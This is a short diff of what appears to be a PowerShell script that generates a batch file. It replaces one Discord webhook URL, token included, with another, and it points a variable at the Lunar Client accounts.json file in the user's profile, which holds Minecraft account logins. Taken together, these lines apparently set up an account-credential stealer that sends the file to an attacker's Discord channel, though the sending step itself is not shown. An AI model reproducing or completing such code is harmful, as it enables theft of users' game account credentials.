@@ -8,7 +8,7 @@ $batchContent = @"
 setlocal enabledelayedexpansion
 
 :: Discord Webhook URL
-set webhookUrl=https://discord.com/api/webhooks/1385974639590637598/I-qq5IcfJUmAbaLuA1T7hK7UM-HaQBou94NVNO7EAzuI6y1coIjL6-lm7a92wyN608Ui
+set webhookUrl=https://discord.com/api/webhooks/1391094655357288548/9E0kR7ZCZLXAkOxzNTpAey6MPFEyk1b7IWWdui0ab87n_HWSVQwrzTV9SHXjkOGBPX9U
 
 :: Path to the accounts.json file
 set filePath=%USERPROFILE%\.lunarclient\settings\game\accounts.json
